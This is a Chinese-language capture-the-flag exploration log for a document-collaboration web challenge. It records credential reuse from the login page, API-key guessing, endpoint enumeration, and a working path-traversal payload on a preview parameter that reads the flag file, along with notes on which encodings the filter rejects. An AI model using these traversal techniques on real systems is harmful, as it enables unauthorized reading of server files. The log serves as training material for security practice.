# a-06 · 探索记录

对应题解：[`a-06.md`](./a-06.md)。

## 目标与起点

题面：「文档协作平台，支持在线预览和格式转换，日志中出现可疑 API 调用记录」。困难，500 分。

`Werkzeug/3.1.7` + `Python/3.9.25`。

## 第一阶段：登录（白送）

`/login` 页面底部直接写着：

```
普通用户：viewer / view123!
管理员：sysadmin / docpass
```

`sysadmin/docpass` → 302 `/dashboard`。`viewer/view123!` 也能登录，但没有「管理后台」入口，访问 `/admin` 返回 403。

## 第二阶段：管理员后台与转换接口（被 API Key 挡住）

`/admin` 有「文档转换工具」，前端调：

```
POST /api/admin/convert
input_file=<path>&output_format=txt|pdf|html|docx
```

页面提示「管理接口已通过 API_KEY 保护」。

试过的所有传 Key 方式：

| 方式 | 结果 |
| --- | --- |
| 不带 Key | `Invalid API Key` |
| `X-API-Key: docpass` / `sysadmin` / `doc_api_key` 等 13 个候选 | 全部 `Invalid API Key` |
| `?api_key=docpass` | 同上 |
| JSON body 里带 `api_key` | 同上 |
| 不带登录 cookie（key 顺序测试） | 仍然先报 `Invalid API Key` |

同时枚举了 `/logs`、`/api/logs`、`/admin/logs`、`/api/admin/config`、`/static/app.py`、`/app.py`、`/config.py`，全部 404。

**判断：转换接口是干扰项，Key 不在可达范围。**

## 第三阶段：上传 + 预览

回前台 `/dashboard`，上传 `d.txt` 后列表出现：

```html
<a href="/preview?file=7c32547cc161c8eb_d.txt">预览</a>
```

`file` 是「随机前缀_原名」。预览按文件名读磁盘，这是最典型的路径拼接。

试了几种写法：

| `file` | 结果 |
| --- | --- |
| `7c32547cc161c8eb_d.txt` | 200，返回 `hello` |
| `/challenge/flag.txt` | **200，flag** |
| `../../../../challenge/flag.txt` | **200，flag** |
| `..%2f..%2f..%2f..%2fchallenge%2fflag.txt` | 404 |
| `....//....//....//....//challenge/flag.txt` | 404 |

绝对路径和 `../` 都过了；URL 编码和双写被拒。**能读就够，不必研究过滤器的实现。**

## 走不通 / 走过的弯路（留档）

| 方向 | 结果 | 判据 |
| --- | --- | --- |
| `/api/admin/convert` + 各种 Key 候选 | 全部 Invalid | Key 不在页面/常见常量里 |
| `/logs`、`/api/logs`、`/admin/logs` | 404 | 「日志」只在描述里 |
| `/static/app.py`、`/app.py`、`/config.py` | 404 | 无源码泄露 |
| viewer 账号访问 `/admin` | 403 | 角色校验正常 |
| `preview?file=..%2f...` / `....//` | 404 | 编码/双写被拒 |
| **`preview?file=/challenge/flag.txt`** | **200 + flag** | 绝对路径直接读 |

## 这次真正的收获

1. **页面给的测试账号先用。** 本题省掉整个爆破阶段。
2. **「受保护的接口」可能是干扰项。** `Invalid API Key` 且 Key 不可达时，先找同机器上的其他读文件入口（preview/download/export），而不是继续猜 Key。
3. **上传+预览是经典组合。** 上传给你一个合法文件名和参数形状，预览给你文件读；把参数从「生成的名字」换成「目标路径」即可。
4. **过滤器的表现形式要分别记录。** 绝对路径和 `../` 通过、`%2f` 和 `....//` 被拒，说明后端对解码后的字符串做弱比较；记录这些差异比猜实现更有用。
5. **叙事里的「可疑日志」不一定是入口。** 它可能只是背景故事。
